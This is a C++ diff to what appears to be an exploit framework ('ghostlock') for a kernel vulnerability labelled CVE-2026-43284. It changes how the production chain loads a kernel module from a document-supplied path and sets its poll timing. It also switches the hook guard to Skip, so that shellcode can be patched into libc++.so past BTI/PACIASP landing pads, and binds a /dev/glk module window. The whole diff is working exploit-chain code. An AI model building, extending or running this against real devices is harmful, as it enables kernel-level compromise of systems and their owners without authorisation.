@@ -116,16 +116,23 @@ namespace ghostlock::backend::cve_2026_43284 {
             result.error = ExecutionBindError::ModuleReadFailed;
             return result;
         }
-        /* Single carrier: the profile token selects one default; token 0/absent
-         * takes the first default the device reports present. */
-        const std::optional<std::uint64_t> token =
-                ghostlock::backend::carrier_path_token_from(document);
-        const steps::CarrierTarget *chosen = nullptr;
-        if (!select_single_carrier(token, device, chosen) || chosen == nullptr) {
+        /* Single carrier (S4 R4): an explicit profile path wins; absent takes the
+         * first default the device reports present. The path view aliases the
+         * Document buffer, which outlives the run. */
+        const std::string_view carrier_path =
+                ghostlock::backend::string_field_from(document, "carrier_path")
+                        .value_or(std::string_view{});
+        if (!select_single_carrier(carrier_path, device, resources.carrier)) {
             result.error = ExecutionBindError::CarrierRejected;
             return result;
         }
-        resources.carrier = *chosen;
+        /* S4 R4 handshake policy from the document, defaulting to the constants
+         * the LKM residency window used to hardcode. */
+        resources.lkm_window.set_handshake_policy(
+                ghostlock::backend::u32_field_from(document, "module_poll_attempts")
+                        .value_or(ghostlock::backend::kCve2026_43284ModulePollAttemptsDefault),
+                ghostlock::backend::u32_field_from(document, "module_poll_interval_ms")
+                        .value_or(ghostlock::backend::kCve2026_43284ModulePollIntervalMsDefault));
 
 #if !defined(__linux__)
         /* The real chain context needs Linux page-cache/crash_dump syscalls; a
@@ -200,7 +207,14 @@ namespace ghostlock::backend::cve_2026_43284 {
         const stage_runner::StagedHookAssets hook_assets =
                 stage_runner::prepare_staged_hook(
                         ctx, steps::kLibcxxPath, steps::kLibcxxSentrySymbol,
-                        steps::HookGuardPolicy::Reject, resources.hook_image,
+                        /* The device's libc++.so sentry entry carries a BTI/PACIASP
+                         * landing pad (bti c) before the patchable instruction; the
+                         * upstream rule advances +4 over it, which is what the staged
+                         * path uses by default (--cve43284-hook-guard skip) and what the
+                         * B5-9h device gate verified. Reject cannot arm the hook on such
+                         * a device, so the production path must skip the guard too.
+                         * TODO(S4): expose as backend.cve_2026_43284.hook.guard. */
+                        steps::HookGuardPolicy::Skip, resources.hook_image,
                         resources.hook_shellcode.data(),
                         resources.hook_shellcode.size(),
                         resources.hook_shellcode_orig.data(), hook_io);
@@ -220,13 +234,19 @@ namespace ghostlock::backend::cve_2026_43284 {
         set_root_program(state.root_program);
         state.deps = BackendTerminalDeps{};
         state.deps.device = device;
+        /* Delta-2: bind the LKM residency window. The runtime owns the /dev/glk
+         * device binding and the contract adapters; the chain opens it only
+         * after WaitResult==LkmLoaded and UNLOADs it in finish() on every path. */
+        ctx.lkm_window = &resources.lkm_window;
         state.deps.chain = make_real_chain_ops(ctx);
         state.deps.carrier = &resources.carrier;
         state.deps.plan = &resources.module.plan;
         state.deps.target_size = target_size;
         state.deps.precheck_lkm = &production_module_precheck;
         state.deps.lkm_image_path = module_path;
-        state.deps.wait_timeout_ms = 5000U;
+        /* The chain wait budget is document policy (S4 R4); the schema default
+         * is 15000 and run_backend_terminal reads state.profile.wait_timeout_ms.
+         * deps.wait_timeout_ms keeps its host-test default. */
         state.deps.umh_channel = terminal::production_umh_channel();
         result.error = ExecutionBindError::None;
         return result;
@@ -241,7 +261,14 @@ namespace ghostlock::backend::cve_2026_43284 {
         /* The resources object owns the path so the state's lkm_image_path view
          * outlives this call; deliberately not a RuntimeConfig field to keep
          * the 43499 CoreSession layout untouched. */
-        resources.module_path = config::helper_module_file(runtime.home_dir);
+        /* S4 R4: the document's lkm_path is the production module path; an
+         * absent value keeps the $GHOSTLOCK_HOME/helper.ko convention. The owned
+         * resources.module_path backs state.deps.lkm_image_path. */
+        const std::string_view document_lkm_path =
+                string_field_from(document, "lkm_path").value_or(std::string_view{});
+        resources.module_path = document_lkm_path.empty()
+                                        ? config::helper_module_file(runtime.home_dir)
+                                        : std::string(document_lkm_path);
         return bind_production_execution_with(
                 session, resources, document, sa, resources.module_path,
                 platform::real_device_probe());
